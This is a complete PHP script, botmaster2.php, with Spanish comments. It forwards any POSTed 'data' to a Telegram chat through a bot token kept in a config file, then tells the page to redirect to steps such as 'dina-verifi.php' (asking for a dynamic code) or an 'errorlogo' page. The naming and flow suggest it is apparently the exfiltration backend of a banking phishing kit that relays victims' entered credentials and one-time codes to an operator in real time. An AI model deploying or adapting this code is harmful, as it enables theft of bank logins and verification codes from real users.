<?php
// botmaster2.php

header("Content-Type: application/json");

// Solo permitir POST
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(405);
    echo json_encode(["error" => "Método no permitido"]);
    exit;
}

$data = $_POST["data"] ?? "";
$keyboard = $_POST["keyboard"] ?? "";
$action = $_POST["action"] ?? null;

$configPath = "botconfig.json";

// Verifica que el archivo exista
if (!file_exists($configPath)) {
    http_response_code(500);
    echo json_encode(["error" => "Archivo de configuración no encontrado"]);
    exit;
}

// Cargar configuración
$config = json_decode(file_get_contents($configPath), true);
$token = $config["token"] ?? null;
$chat_id = $config["chat_id"] ?? null;

// Validar datos necesarios
if (!$token || !$chat_id || !$data) {
    http_response_code(400);
    echo json_encode(["error" => "Faltan datos necesarios (token, chat_id o data)"]);
    exit;
}

// Armar mensaje para Telegram
$mensaje = [
    "chat_id" => $chat_id,
    "text" => $data,
    "parse_mode" => "HTML"
];

if ($keyboard) {
    $mensaje["reply_markup"] = json_decode($keyboard, true);
}

// Enviar mensaje a Telegram
$ch = curl_init("https://api.telegram.org/bot$token/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($mensaje));
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);

$response = curl_exec($ch);
curl_close($ch);

// Respuesta según acción
$redirects = [
    "pedir_dinamica" => "dina-verifi.php",
    "error_logo"     => "errorlogo.html",
    "finalizar"      => "index.html"
];

if ($action && isset($redirects[$action])) {
    echo json_encode([
        "status" => "ok",
        "redirect" => $redirects[$action]
    ]);
} else {
    echo json_encode(["status" => "ok"]);
}
